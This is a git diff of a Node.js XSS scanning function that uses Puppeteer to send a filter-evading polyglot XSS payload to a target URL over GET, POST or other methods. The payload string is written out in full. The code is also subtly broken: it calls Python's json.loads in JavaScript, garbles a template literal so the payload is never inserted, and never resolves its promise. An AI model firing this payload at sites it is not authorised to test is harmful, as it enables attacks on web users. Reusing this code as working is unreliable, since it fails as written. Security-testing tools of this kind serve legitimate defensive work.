@@ -6,14 +6,19 @@ const puppeteer = require('puppeteer');
 
 // A polygot XSS payload, capable of getting past many XSS filters
 
-exports.xssScan = async (url, reqType, dataType) => {
+exports.xssScan = async (url, parameter, reqType, dataType) => {
     // A polygot XSS payload, capable of getting past many XSS filters
-    let payload = encodeURIComponent("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e");
+    let payload = encodeURIComponent(`${parameter}=` + "username=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e");
+    let contentType = 'application/x-www-form-urlencoded';
     if(dataType === "base64") {
         payload = btoa(payload);
+        contentType = "application/octet-stream";
     } else if (dataType === "JSON") {
-        // todo: add an option for them to provide a name/key to the data.
-        payload = json.loads("{data: " + payload + "}");
+        payload = json.loads(`{${parameter}: " + payload + "}`);
+        if(reqType === "GET" || reqType === "DELETE") {
+            payload = encodeURIComponent(payload);
+        }
+        contentType = 'application/json';
     }
 
     return new Promise(async (res,rej)=>{
@@ -32,21 +37,34 @@ exports.xssScan = async (url, reqType, dataType) => {
             }]
         })
 
+        await page.setRequestInterception(true);
+
         // Simple payload submission in the parameter
         if(reqType === "GET" || reqType === "DELETE") {
-            await page.goto(url);
-        } else {
-            await page.setRequestInterception(true);
             page.on('request', interceptedRequest => {
-                var data = {
-                    'method': 'POST',
-                    'postData': payload
-                };
-                interceptedRequest.continue(data);
+                interceptedRequest.continue({
+                    method: reqType,
+                    headers: {
+                        ...interceptedRequest.headers(),
+                        'Content-Type': contentType,
+                    },
+                });
+            });
+            await page.goto(url + `?${parameter}=` + payload);
+        } else {
+            page.on('request', interceptedRequest => {
+                interceptedRequest.continue({
+                    method: reqType,
+                    postData: payload,
+                    headers: {
+                        ...interceptedRequest.headers(),
+                        'Content-Type': contentType,
+                    },
+                });
             });
             await page.goto(url);
         }
-        await new Promise((resolve) => setTimeout(resolve, 2000));
+        await new Promise((resolve) => setTimeout(resolve, 3000));
         await browser.close()
         return [];
     })
